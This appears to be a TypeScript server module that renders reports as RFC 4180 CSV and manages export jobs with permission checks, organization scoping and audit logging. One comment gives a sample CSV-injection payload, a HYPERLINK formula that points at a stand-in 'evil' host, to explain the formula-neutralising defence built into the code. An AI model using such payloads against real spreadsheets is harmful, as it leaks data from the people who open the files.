/**
 * Turning a report into a file.
 *
 * Two separate concerns, deliberately kept apart:
 *
 *   FORMATTING  `toCsv` is pure. It takes rows and a column definition and
 *               returns text. No database, no permissions, no AccessContext --
 *               which is what makes the RFC 4180 edge cases (a comma in a
 *               student's address, a newline in a note, a quote in a name)
 *               unit-testable without a fixture.
 *
 *   THE JOB     `createExportJob` / `completeExportJob` own the ExportJob row and
 *               the bytes in the object store. An export is a job rather than a
 *               synchronous download because a three-year finance report is not
 *               something to compute inside a request that a browser will time
 *               out of, and because `ExportJob.filters` is what makes the file
 *               reproducible six months later.
 *
 * A column carries an i18n LABEL KEY, never a label. The exporter has no
 * dictionary -- the caller passes a `translate` function, so the same report
 * exports with Uzbek headers for one user and Russian for the next without this
 * module knowing any language.
 */

import type { ExportFormat, Prisma } from '@/generated/prisma/client';
import { prisma, withTransaction, type Db } from '@/server/db/client';
import { NotFoundError, StateInvalidError } from '@/server/errors';
import { AUDIT_ACTIONS, record as recordAudit, severityFor } from '@/server/audit';
import { organizationFilter, requirePermission, type AccessContext } from '@/server/rbac/access';
import { generateStorageKey, getStorage } from '@/server/storage';
import { logger } from '@/server/observability/logger';
import { currencyExponent, isSupportedCurrency, money, toMajorString } from '@/lib/money';
import { isReportKey, type ReportFilters, type ReportRow, type ReportValue } from './types';

// ---------------------------------------------------------------------------
// Column definitions
// ---------------------------------------------------------------------------

/**
 * How a cell should be rendered when no explicit formatter is given. The UI reads
 * the same hint to pick an alignment and a chart axis, so the two cannot drift.
 */
export type ReportColumnKind = 'text' | 'number' | 'money' | 'percentPpm' | 'date' | 'boolean';

export interface ReportColumn<TRow extends ReportRow> {
  /** The row property this column reads. */
  readonly key: string & keyof TRow;
  /** Dotted i18n key, e.g. `reports.columns.studentName`. Never display text. */
  readonly labelKey: string;
  readonly kind?: ReportColumnKind;
  /**
   * The column holding the ISO-4217 code for a `money` column. Money is exported
   * in MAJOR units, and the exponent that conversion needs is a property of the
   * currency, not of the number -- so a money column must be able to find it.
   */
  readonly currencyKey?: string & keyof TRow;
  /** Overrides the `kind` default entirely. */
  readonly format?: (value: ReportValue, row: TRow) => string;
}

/** A money column, wired to the row's own currency column. */
export function moneyColumn<TRow extends ReportRow>(
  key: string & keyof TRow,
  labelKey: string,
  currencyKey: string & keyof TRow,
): ReportColumn<TRow> {
  return { key, labelKey, kind: 'money', currencyKey };
}

export function percentColumn<TRow extends ReportRow>(
  key: string & keyof TRow,
  labelKey: string,
): ReportColumn<TRow> {
  return { key, labelKey, kind: 'percentPpm' };
}

// ---------------------------------------------------------------------------
// Cell rendering
// ---------------------------------------------------------------------------

/**
 * Minor units as an exact major-unit decimal string.
 *
 * NEVER a float: `Number(150000000) / 100` is fine for a chart pixel and wrong
 * for a figure an accountant reconciles against a bank statement. `toMajorString`
 * does the division on the BigInt.
 */
function formatMoneyCell(value: ReportValue, currency: unknown): string {
  if (value === null || value === '') return '';
  if (typeof currency !== 'string' || !isSupportedCurrency(currency)) {
    // An unknown currency must not be guessed at: emitting the raw minor units
    // is wrong by a factor of 100, so say nothing rather than something false.
    logger.warn('reports.export.money_without_currency', { currency });
    return '';
  }
  try {
    return toMajorString(money(BigInt(String(value)), currency));
  } catch {
    return '';
  }
}

/** Parts-per-million rendered as a percentage with four decimals of headroom. */
function formatPercentCell(value: ReportValue): string {
  if (value === null || typeof value !== 'number') return '';
  return (value / 10_000).toFixed(2);
}

function defaultCell<TRow extends ReportRow>(column: ReportColumn<TRow>, row: TRow): string {
  const value = row[column.key] ?? null;

  switch (column.kind) {
    case 'money':
      return formatMoneyCell(value, column.currencyKey ? row[column.currencyKey] : undefined);
    case 'percentPpm':
      return formatPercentCell(value);
    case 'boolean':
      return value === null ? '' : value ? 'true' : 'false';
    case 'number':
      return value === null ? '' : String(value);
    default:
      return value === null ? '' : String(value);
  }
}

export function renderCell<TRow extends ReportRow>(column: ReportColumn<TRow>, row: TRow): string {
  if (column.format) return column.format(row[column.key] ?? null, row);
  return defaultCell(column, row);
}

// ---------------------------------------------------------------------------
// CSV
// ---------------------------------------------------------------------------

/** RFC 4180 says CRLF, and Excel on Windows is the consumer that cares. */
const CSV_EOL = '\r\n';

/**
 * A UTF-8 BOM.
 *
 * Excel on Windows does not detect UTF-8 in a .csv file: without these three
 * bytes it decodes the file in the system ANSI codepage, and every Cyrillic and
 * Uzbek-Latin name in the export arrives as mojibake. Every other consumer
 * (LibreOffice, pandas, `csv` in Python, a text editor) tolerates a leading BOM,
 * so it is the cheap side of the trade.
 */
export const UTF8_BOM = '﻿';

/**
 * Characters that make a spreadsheet treat a cell as a formula rather than text.
 *
 * A student note of `=HYPERLINK("http://evil/"&A1)` is a CSV injection: the CSV
 * itself is perfectly valid, and the damage happens when a colleague opens it.
 * Neutralising it here, at the one place every export passes through, is the only
 * place it can be done reliably.
 */
const FORMULA_LEAD = /^[=+\-@\t\r]/;

function neutraliseFormula(value: string): string {
  // A leading apostrophe is the conventional mitigation: spreadsheets read it as
  // "the rest is literal text" and hide it, and a plain CSV parser sees one extra
  // character rather than an executed formula.
  return FORMULA_LEAD.test(value) ? `'${value}` : value;
}

function escapeField(value: string, delimiter: string): string {
  const neutralised = neutraliseFormula(value);
  const mustQuote =
    neutralised.includes(delimiter) ||
    neutralised.includes('"') ||
    neutralised.includes('\n') ||
    neutralised.includes('\r');

  if (!mustQuote) return neutralised;
  // RFC 4180: a quote inside a quoted field is doubled.
  return `"${neutralised.replace(/"/g, '""')}"`;
}

export interface ToCsvOptions {
  /** Defaults to `,`. Some locales configure Excel to expect `;`. */
  readonly delimiter?: string;
  /** Resolves a column's `labelKey`. Defaults to emitting the key itself. */
  readonly translate?: (labelKey: string) => string;
  /** Set false for an append, where a second BOM would corrupt the file. */
  readonly bom?: boolean;
  readonly includeHeader?: boolean;
}

/**
 * RFC 4180 CSV for a report.
 *
 * Pure, and the only CSV writer in the codebase: a second one would disagree
 * about quoting the first time a name contained a comma.
 */
export function toCsv<TRow extends ReportRow>(
  rows: readonly TRow[],
  columns: readonly ReportColumn<TRow>[],
  options: ToCsvOptions = {},
): string {
  const delimiter = options.delimiter ?? ',';
  const translate = options.translate ?? ((key: string) => key);

  const lines: string[] = [];

  if (options.includeHeader !== false) {
    lines.push(
      columns.map((column) => escapeField(translate(column.labelKey), delimiter)).join(delimiter),
    );
  }
  for (const row of rows) {
    lines.push(
      columns.map((column) => escapeField(renderCell(column, row), delimiter)).join(delimiter),
    );
  }

  // Trailing CRLF: RFC 4180 allows it and every parser accepts it, while its
  // absence makes a concatenated export run two records together.
  const body = lines.length > 0 ? `${lines.join(CSV_EOL)}${CSV_EOL}` : '';
  return options.bom === false ? body : `${UTF8_BOM}${body}`;
}

/** Major-unit conversion for a chart or a JSON export. Exact, via BigInt. */
export function minorToMajorString(amountMinor: bigint, currency: string): string {
  if (!isSupportedCurrency(currency)) return amountMinor.toString();
  return toMajorString({ amountMinor, currency });
}

/** Decimal places the currency subdivides into, for building a money series. */
export function exponentFor(currency: string): number {
  return isSupportedCurrency(currency) ? currencyExponent(currency) : 0;
}

// ---------------------------------------------------------------------------
// The ExportJob lifecycle
// ---------------------------------------------------------------------------

const FORMAT_MIME: Record<ExportFormat, string> = {
  CSV: 'text/csv',
  JSON: 'application/json',
  XLSX: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
  PDF: 'application/pdf',
};

/**
 * Generated files are not kept forever: an export is a snapshot of data the
 * source of truth still holds, and a stale CSV of last year's debtors sitting in
 * the object store is a liability rather than an asset.
 */
const EXPORT_RETENTION_DAYS = 7;

export interface CreateExportJobInput {
  readonly reportKey: string;
  readonly format?: ExportFormat;
  /** Stored verbatim so the same file can be regenerated later. */
  readonly filters: ReportFilters;
}

export interface ExportJobSummary {
  readonly id: string;
  readonly type: string;
  readonly format: ExportFormat;
  readonly status: 'PENDING' | 'RUNNING' | 'COMPLETED' | 'FAILED';
  readonly rowCount: number | null;
  readonly storageKey: string | null;
  readonly expiresAt: Date | null;
}

/**
 * Register an export. The file is produced later, by the job worker calling
 * `completeExportJob`; this only records the request.
 */
export async function createExportJob(
  ctx: AccessContext,
  input: CreateExportJobInput,
  db?: Db,
): Promise<ExportJobSummary> {
  requirePermission(ctx, 'reports.export');

  if (!isReportKey(input.reportKey)) {
    // A job naming a report nothing can run would sit PENDING forever, which
    // looks like a stuck queue rather than a bad request.
    throw new NotFoundError('Report', input.reportKey);
  }

  const format = input.format ?? 'CSV';

  return withTransaction(
    async (tx) => {
      const job = await tx.exportJob.create({
        data: {
          organizationId: ctx.organizationId,
          type: input.reportKey,
          format,
          // Cast through the Prisma JSON input type: ReportFilters is a plain
          // readonly record of scalars and string arrays, which is structurally a
          // JSON object, but TypeScript will not infer that for a `readonly`
          // interface.
          filters: input.filters as unknown as Prisma.InputJsonValue,
          status: 'PENDING',
          createdById: ctx.isSystem ? null : ctx.userId,
        },
        select: { id: true, type: true, format: true, status: true },
      });

      await recordAudit(
        ctx,
        {
          action: AUDIT_ACTIONS.EXPORT_GENERATED,
          entityType: 'ExportJob',
          entityId: job.id,
          summary: `Export requested: ${input.reportKey} (${format})`,
          severity: severityFor(AUDIT_ACTIONS.EXPORT_GENERATED),
          metadata: { reportKey: input.reportKey, format },
        },
        tx,
      );

      return {
        id: job.id,
        type: job.type,
        format: job.format,
        status: 'PENDING' as const,
        rowCount: null,
        storageKey: null,
        expiresAt: null,
      };
    },
    { existing: db },
  );
}

export interface CompleteExportJobInput {
  readonly exportJobId: string;
  /** The rendered file. Text for CSV/JSON, bytes for XLSX/PDF. */
  readonly content: string | Uint8Array;
  readonly rowCount: number;
  /** True when the report hit its row cap; recorded so the file is not read as complete. */
  readonly truncated?: boolean;
}

/**
 * Store the rendered file and close the job.
 *
 * The bytes go to the object store BEFORE the transaction opens, for two reasons.
 * A row pointing at a key that does not exist would offer the user a download
 * that 404s, whereas an orphaned object is invisible and reclaimed by the
 * retention sweep -- so the write must come first. And an S3 PUT is a network
 * round trip: holding a database transaction open across it would pin one of a
 * deliberately small pool of connections for the length of an upload.
 *
 * The state check therefore runs twice: once before the upload, to avoid
 * uploading for a job that is already closed, and again inside the transaction,
 * where it is the one that actually decides. Two workers racing to complete the
 * same job both upload; only one updates the row and the other gets a
 * StateInvalidError.
 */
export async function completeExportJob(
  ctx: AccessContext,
  input: CompleteExportJobInput,
  db?: Db,
): Promise<ExportJobSummary> {
  requirePermission(ctx, 'reports.export');

  const client = db ?? prisma;

  // Scope in the same where: fetching then checking would confirm the existence
  // of another organisation's export.
  const job = await client.exportJob.findFirst({
    where: { id: input.exportJobId, ...organizationFilter(ctx) },
    select: { id: true, type: true, format: true, status: true },
  });
  if (!job) throw new NotFoundError('Export', input.exportJobId);
  if (job.status === 'COMPLETED' || job.status === 'FAILED') {
    throw new StateInvalidError('export', job.status.toLowerCase(), 'completed');
  }

  const mimeType = FORMAT_MIME[job.format];
  const body =
    typeof input.content === 'string'
      ? Buffer.from(input.content, 'utf8')
      : Buffer.from(input.content);

  const stored = await getStorage().put(
    generateStorageKey({
      organizationId: ctx.organizationId,
      ownerType: 'ORGANIZATION',
      mimeType,
    }),
    body,
    { contentType: mimeType, contentLength: body.byteLength },
  );

  return withTransaction(
    async (tx) => {
      const current = await tx.exportJob.findFirst({
        where: { id: job.id, ...organizationFilter(ctx) },
        select: { status: true },
      });
      if (!current) throw new NotFoundError('Export', input.exportJobId);
      if (current.status === 'COMPLETED' || current.status === 'FAILED') {
        throw new StateInvalidError('export', current.status.toLowerCase(), 'completed');
      }

      const expiresAt = new Date(Date.now() + EXPORT_RETENTION_DAYS * 86_400_000);

      const updated = await tx.exportJob.update({
        where: { id: job.id },
        data: {
          status: 'COMPLETED',
          storageKey: stored.key,
          rowCount: input.rowCount,
          finishedAt: new Date(),
          expiresAt,
          error: input.truncated
            ? `Truncated at ${input.rowCount} rows; narrow the period or the filters for a complete file.`
            : null,
        },
        select: { id: true, type: true, format: true, rowCount: true, storageKey: true, expiresAt: true },
      });

      // DATA_EXPORTED rather than EXPORT_GENERATED: this is the point at which
      // records actually left the system, and it is an elevated action.
      await recordAudit(
        ctx,
        {
          action: AUDIT_ACTIONS.DATA_EXPORTED,
          entityType: 'ExportJob',
          entityId: job.id,
          summary: `Exported ${input.rowCount} rows of ${job.type}`,
          severity: severityFor(AUDIT_ACTIONS.DATA_EXPORTED),
          metadata: {
            reportKey: job.type,
            format: job.format,
            rowCount: input.rowCount,
            truncated: input.truncated ?? false,
            sizeBytes: body.byteLength,
          },
        },
        tx,
      );

      return {
        id: updated.id,
        type: updated.type,
        format: updated.format,
        status: 'COMPLETED' as const,
        rowCount: updated.rowCount,
        storageKey: updated.storageKey,
        expiresAt: updated.expiresAt,
      };
    },
    { existing: db },
  );
}

export interface FailExportJobInput {
  readonly exportJobId: string;
  /** Shown to the user who asked for the file. Must not carry a stack trace. */
  readonly reason: string;
}

/**
 * Mark an export as failed.
 *
 * A failed export is a first-class state, not a job left PENDING: the user who
 * asked for the file is told it could not be produced instead of watching a
 * spinner that never resolves.
 */
export async function failExportJob(
  ctx: AccessContext,
  input: FailExportJobInput,
  db?: Db,
): Promise<ExportJobSummary> {
  requirePermission(ctx, 'reports.export');

  return withTransaction(
    async (tx) => {
      const job = await tx.exportJob.findFirst({
        where: { id: input.exportJobId, ...organizationFilter(ctx) },
        select: { id: true, type: true, format: true, status: true },
      });
      if (!job) throw new NotFoundError('Export', input.exportJobId);
      if (job.status === 'COMPLETED') {
        throw new StateInvalidError('export', 'completed', 'failed');
      }

      const updated = await tx.exportJob.update({
        where: { id: job.id },
        data: { status: 'FAILED', error: input.reason.slice(0, 500), finishedAt: new Date() },
        select: { id: true, type: true, format: true, rowCount: true, storageKey: true, expiresAt: true },
      });

      logger.warn('reports.export.failed', {
        organizationId: ctx.organizationId,
        exportJobId: job.id,
        reportKey: job.type,
        reason: input.reason,
      });

      return {
        id: updated.id,
        type: updated.type,
        format: updated.format,
        status: 'FAILED' as const,
        rowCount: updated.rowCount,
        storageKey: updated.storageKey,
        expiresAt: updated.expiresAt,
      };
    },
    { existing: db },
  );
}
